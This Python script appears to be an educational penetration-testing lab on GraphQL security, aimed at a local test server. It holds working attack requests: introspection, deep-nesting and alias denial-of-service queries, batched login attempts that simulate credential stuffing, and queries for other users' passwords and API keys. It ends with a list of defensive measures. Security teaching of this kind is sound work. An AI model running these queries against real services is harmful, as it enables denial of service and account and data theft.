#!/usr/bin/env python3
"""
API Penetration Testing Lab - Advanced Lab 1: GraphQL Security

Topics: GraphQL introspection, DoS attacks, batching, authorization issues
Difficulty: Advanced
"""

import requests
import json
from urllib.parse import urljoin
from typing import Dict, List, Any

BASE_URL = "http://localhost:5000/graphql"

class GraphQLSecurityLab:
    """Lab for advanced GraphQL vulnerability testing"""
    
    def __init__(self):
        self.session = requests.Session()
        self.base_url = BASE_URL
    
    # EXERCISE 1: GraphQL Introspection
    def exercise_1_graphql_introspection(self):
        """
        Exercise 1: Enumerate GraphQL schema via introspection
        
        Learning Goals:
        - GraphQL introspection query
        - Schema discovery
        - Type enumeration
        - Field analysis
        
        Tasks:
        1. Enable introspection
        2. Discover all types
        3. Analyze field permissions
        """
        print("\n=== Exercise 1: GraphQL Introspection ===")
        
        # Standard introspection query
        introspection_query = '''
        query IntrospectionQuery {
          __schema {
            types {
              name
              kind
              description
              fields {
                name
                type {
                  name
                  kind
                }
              }
            }
          }
        }
        '''
        
        print("\n[Task 1] Sending introspection query...")
        try:
            response = self.session.post(
                self.base_url,
                json={"query": introspection_query}
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and '__schema' in data['data']:
                    types = data['data']['__schema']['types']
                    print(f"[+] Introspection enabled!")
                    print(f"    Found {len(types)} types")
                    
                    # Print custom types (excluding built-in)
                    custom_types = [t for t in types if not t['name'].startswith('__')]
                    print(f"    Custom types: {len(custom_types)}")
                    for t in custom_types[:5]:
                        print(f"      - {t['name']} ({t['kind']})")
                else:
                    print(f"[-] Introspection query failed")
            else:
                print(f"[-] Request failed: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
    
    # EXERCISE 2: GraphQL Query Complexity DoS
    def exercise_2_complexity_dos(self):
        """
        Exercise 2: Test GraphQL complexity attacks
        
        Learning Goals:
        - Query depth attacks
        - Field explosion attacks
        - Resource exhaustion
        
        Tasks:
        1. Create deeply nested queries
        2. Test complexity limits
        """
        print("\n=== Exercise 2: GraphQL Complexity & DoS ===")
        
        print("\n[Task 1] Testing deeply nested queries...")
        
        # Create a nested query
        deep_query = '''
        query {
          user {
            posts {
              comments {
                author {
                  posts {
                    comments {
                      author {
                        posts {
                          comments {
                            author {
                              name
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        '''
        
        try:
            response = self.session.post(
                self.base_url,
                json={"query": deep_query},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'errors' in data:
                    print(f"[-] Query rejected with errors")
                    for error in data['errors'][:1]:
                        print(f"    {error.get('message', 'Unknown error')}")
                else:
                    print(f"[!] Deep query accepted - potential DoS vector")
                    print(f"    Response size: {len(response.text)} bytes")
            else:
                print(f"[-] Request failed: {response.status_code}")
        except requests.exceptions.Timeout:
            print(f"[!] Query caused timeout - DoS potential")
        except Exception as e:
            print(f"Error: {e}")
    
    # EXERCISE 3: GraphQL Batching Attacks
    def exercise_3_batching_attacks(self):
        """
        Exercise 3: Test GraphQL batching vulnerabilities
        
        Learning Goals:
        - Batching for automation
        - Credential stuffing via batching
        - Rate limit bypass
        
        Tasks:
        1. Send batched queries
        2. Test rate limiting with batches
        """
        print("\n=== Exercise 3: GraphQL Batching Attacks ===")
        
        print("\n[Task 1] Testing query batching...")
        
        # Multiple queries in one request
        batched_queries = [
            {"query": 'query { user(id: "1") { name email } }'},
            {"query": 'query { user(id: "2") { name email } }'},
            {"query": 'query { user(id: "3") { name email } }'},
        ]
        
        try:
            response = self.session.post(
                self.base_url,
                json=batched_queries
            )
            
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, list):
                    print(f"[+] Batching supported")
                    print(f"    Processed {len(data)} queries in single request")
                    
                    # Attempt credential stuffing simulation
                    print(f"\n[Task 2] Testing batching for credential stuffing...")
                    login_attempts = [
                        {"query": 'mutation { login(username: "admin", password: "pass1") { token } }'},
                        {"query": 'mutation { login(username: "admin", password: "pass2") { token } }'},
                        {"query": 'mutation { login(username: "admin", password: "pass3") { token } }'},
                    ]
                    
                    response = self.session.post(
                        self.base_url,
                        json=login_attempts
                    )
                    
                    print(f"    Sent 3 login attempts in single request")
                    print(f"    Response: {response.status_code}")
                else:
                    print(f"[-] Batching not supported")
            else:
                print(f"[-] Request failed: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
    
    # EXERCISE 4: GraphQL Authorization Testing
    def exercise_4_authorization_issues(self):
        """
        Exercise 4: Test GraphQL authorization
        
        Learning Goals:
        - Field-level authorization
        - Type authorization
        - Cross-user data access
        
        Tasks:
        1. Access protected fields
        2. Test user data isolation
        """
        print("\n=== Exercise 4: GraphQL Authorization ===")
        
        print("\n[Task 1] Testing field-level authorization...")
        
        # Try to access sensitive fields
        sensitive_query = '''
        query {
          user(id: "other_user") {
            name
            email
            password
            creditCard
            apiKey
            privateData
          }
        }
        '''
        
        try:
            response = self.session.post(
                self.base_url,
                json={"query": sensitive_query}
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and data['data'].get('user'):
                    user_data = data['data']['user']
                    
                    # Check for sensitive fields
                    sensitive_fields = ['password', 'creditCard', 'apiKey', 'privateData']
                    exposed = [f for f in sensitive_fields if f in user_data and user_data[f]]
                    
                    if exposed:
                        print(f"[!] Authorization bypass - exposed fields:")
                        for field in exposed:
                            print(f"    - {field}")
                    else:
                        print(f"[-] Sensitive fields properly protected")
        except Exception as e:
            print(f"Error: {e}")
    
    # EXERCISE 5: GraphQL Error-Based Information Disclosure
    def exercise_5_error_disclosure(self):
        """
        Exercise 5: Test error-based information disclosure
        
        Learning Goals:
        - GraphQL error messages
        - Stack traces in responses
        - Query suggestions
        
        Tasks:
        1. Trigger errors
        2. Analyze error responses
        """
        print("\n=== Exercise 5: Error-Based Information Disclosure ===")
        
        print("\n[Task 1] Testing error messages...")
        
        # Malformed query
        bad_query = 'query { invalidField { subField } }'
        
        try:
            response = self.session.post(
                self.base_url,
                json={"query": bad_query}
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'errors' in data:
                    print(f"[+] Error response received")
                    for error in data['errors']:
                        message = error.get('message', '')
                        print(f"    Error: {message}")
                        
                        # Check for information disclosure
                        if 'suggestion' in message or 'Did you mean' in message:
                            print(f"    [!] Query suggestions enabled - potential enumeration vector")
        except Exception as e:
            print(f"Error: {e}")
    
    # EXERCISE 6: GraphQL Alias Attacks
    def exercise_6_alias_attacks(self):
        """
        Exercise 6: Test GraphQL alias attacks
        
        Learning Goals:
        - Alias-based resource exhaustion
        - Rate limiting bypass via aliases
        - Field name obfuscation
        
        Tasks:
        1. Use aliases to duplicate queries
        2. Bypass rate limits
        """
        print("\n=== Exercise 6: GraphQL Alias Attacks ===")
        
        print("\n[Task 1] Testing alias-based resource exhaustion...")
        
        # Create multiple aliases for same field
        alias_query = '\n'.join([
            f'a{i}: user(id: "1") {{ name email }}' 
            for i in range(100)
        ])
        
        query = f'query {{ {alias_query} }}'
        
        try:
            response = self.session.post(
                self.base_url,
                json={"query": query}
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data:
                    aliases_returned = len([k for k in data['data'].keys() if k.startswith('a')])
                    print(f"[!] Alias attack potential")
                    print(f"    Sent 100 aliased queries")
                    print(f"    Received {aliases_returned} results")
                    print(f"    Response size: {len(response.text)} bytes")
        except Exception as e:
            print(f"Error: {e}")
    
    def run_all_exercises(self):
        """Run all exercises"""
        print("\n" + "="*60)
        print("API Penetration Testing Lab - Advanced Lab 1")
        print("GraphQL Security")
        print("="*60)
        
        self.exercise_1_graphql_introspection()
        self.exercise_2_complexity_dos()
        self.exercise_3_batching_attacks()
        self.exercise_4_authorization_issues()
        self.exercise_5_error_disclosure()
        self.exercise_6_alias_attacks()
        
        print("\n" + "="*60)
        print("Lab Completed!")
        print("="*60)
        print("\nKey Security Measures:")
        print("1. Disable introspection in production")
        print("2. Implement query complexity analysis")
        print("3. Limit query depth")
        print("4. Implement rate limiting")
        print("5. Use field-level authorization")
        print("6. Avoid exposing sensitive data in errors")
        print("\nNext: Lab 2 - SSRF and Advanced Exploitation")

if __name__ == "__main__":
    try:
        lab = GraphQLSecurityLab()
        lab.run_all_exercises()
    except KeyboardInterrupt:
        print("\n\nLab interrupted by user.")
    except Exception as e:
        print(f"\nLab error: {e}")
